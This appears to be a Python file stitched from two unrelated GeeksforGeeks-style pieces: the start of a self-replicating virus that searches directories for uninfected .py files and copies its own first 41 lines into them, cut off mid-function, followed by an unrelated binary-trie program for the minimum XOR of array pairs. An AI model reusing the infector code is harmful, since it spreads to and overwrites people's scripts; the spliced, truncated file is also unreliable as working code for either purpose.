#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# class for the basic Trie Node
class TrieNode:
    def __init__(self):
 
        # Child array with 0 and 1
        self.child = [None]*2
 
        # meant for the lead Node
        self.value = None
 
class Trie:
 
    def __init__(self):
        # initialise the root Node
        self.root = self.getNode()
 
    def getNode(self):
        # get a new Trie Node
        return TrieNode()
 
    # inserts a new element
    def insert(self,key):
        temp = self.root
  
        # 32 bit valued binary digit
        for i in range(31,-1,-1):
 
            # finding the bit at ith position
            curr = (key>>i)&(1)
 
            # if the child is None create one
            if(temp.child[curr] is None):
                temp.child[curr] = self.getNode()
            temp = temp.child[curr]
 
        # add value to the leaf node
        temp.value = key
 
    # traverse the trie and xor with the most similar element
    def xorUtil(self,key):
        temp = self.root
 
        # 32 bit valued binary digit
        for i in range(31,-1,-1):
 
            # finding the bit at ith position
            curr = (key>>i)&1
 
            # traverse for the same bit
            if(temp.child[curr] is not None):
                temp = temp.child[curr]
 
            # traverse if the same bit is not set in trie
            elif(temp.child[1-curr] is not None):
                temp = temp.child[1-curr]
 
        # return with the xor of the value
        return temp.value^key
             
         
def minXor(arr):
 
        # set m to a large number
        m = 2**30
 
        # initialize Trie
        trie = Trie()
 
        # insert the first element
        trie.insert(arr[0])
 
        # for each element in the array
        for i in range(1,len(arr)):
 
            # find the minimum xor value
            m = min(m,trie.xorUtil(arr[i]))
             
            # insert the new element
            trie.insert(arr[i])
        return m
 
# Driver Code
if __name__=="__main__":
    sample = [9,5,3]
    print(minXor(sample))
 
#code contributed by Ashwin Bhat
# Time Complexity: O(n)